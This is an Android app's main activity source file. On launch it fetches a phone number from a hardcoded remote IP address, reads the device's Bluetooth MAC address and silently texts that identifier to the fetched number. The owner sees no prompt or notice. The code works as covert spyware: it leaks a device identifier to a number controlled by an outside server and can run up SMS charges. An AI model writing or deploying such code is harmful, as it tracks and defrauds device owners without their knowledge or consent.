package max.hnust.sendsms;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import android.app.Activity;
import android.app.PendingIntent;
import android.bluetooth.BluetoothAdapter;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

public class MainActivity extends Activity {

	public PendingIntent paIntent;
	public SmsManager smsManager;
	public RequestQueue mQueue;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);		
		gitTel();
	}

	public void doSendSMSTo(String phoneNumber, String message) {
		paIntent = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
		smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(phoneNumber, null, message, paIntent, null);
		/*
		 * if(PhoneNumberUtils.isGlobalPhoneNumber(phoneNumber)){ Intent intent
		 * = new Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:"+phoneNumber));
		 * intent.putExtra("sms_body", message); startActivity(intent); }
		 */
	}

	public void gitTel() {
		Log.e("TAG", "-1----");
		mQueue = Volley.newRequestQueue(getApplicationContext());
		StringRequest mstringRequest = new StringRequest("http://121.201.8.196/tms/newfile.html",
				new Response.Listener<String>() {
					@Override
					public void onResponse(String response) {
						Log.d("TAG", response);
						String phone=response.trim();
						String bluetooth = BluetoothAdapter.getDefaultAdapter().getAddress();
						doSendSMSTo(phone, "10101"+bluetooth);
					}
				}, new Response.ErrorListener() {
					@Override
					public void onErrorResponse(VolleyError error) {
						Log.e("TAG", error.getMessage() + "-----");
					}
				});
		mQueue.add(mstringRequest);
		Log.e("TAG", "-2----");
	}
}
